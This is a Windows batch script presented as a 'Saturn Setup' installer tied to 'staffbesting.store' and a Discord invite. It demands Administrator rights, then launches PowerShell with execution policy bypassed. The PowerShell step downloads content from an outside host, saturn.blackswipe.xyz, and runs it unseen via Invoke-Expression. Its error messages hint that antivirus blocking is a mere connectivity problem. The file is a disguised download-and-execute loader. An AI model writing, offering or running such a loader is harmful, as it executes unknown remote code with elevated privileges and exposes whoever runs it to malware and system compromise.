@echo off
title Saturn Setup - v2026
mode con: cols=85 lines=32
color 0B
cls

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo      [ + ] [ ERROR ] This script requires Administrator privileges.
    echo      [ + ] Please right-click and select "Run as administrator"
    pause
    exit /b
)

cls
echo.
echo      [ + ] staffbesting.store @ .gg/staffbesting
echo      [ + ] Starting Saturn installation, Please wait...
echo      [ + ] Initializing...
timeout /t 1 /nobreak >nul

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
	"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;" ^
    "Write-Host '     [ + ] Connecting to Saturn server...' -ForegroundColor Cyan;" ^
	"try {" ^
		" $response = Invoke-WebRequest -Uri 'https://saturn.blackswipe.xyz' -UseBasicParsing -ErrorAction Stop;" ^
		" Write-Host '     [ + ] Download successful. Executing...' -ForegroundColor Green;" ^
		" Invoke-Expression $response.Content;" ^
		"} catch {" ^
    "    Write-Host '     [ + ] [ FAILED ] Could not download' -ForegroundColor Red;" ^
    "    Write-Host '     [ + ] Error: ' -NoNewline -ForegroundColor Yellow;" ^
    "    Write-Host $_.Exception.Message -ForegroundColor Yellow;" ^
    "    Write-Host '';" ^
    "    Write-Host '     [ + ] Possible reasons:' -ForegroundColor DarkYellow;" ^
    "    Write-Host '     [ + ] • No internet connection' -ForegroundColor DarkYellow;" ^
    "    Write-Host '     [ + ] • Server is down or blocked' -ForegroundColor DarkYellow;" ^
    "    Write-Host '     [ + ] • Antivirus / Firewall blocked the request' -ForegroundColor DarkYellow;" ^
    "    Write-Host '     [ + ] • Proxy / VPN interference' -ForegroundColor DarkYellow;" ^
    "}"

echo      ==================================================
echo                       Process finished
echo      ==================================================
echo      [ + ] Press any key to exit...
pause >nul
exit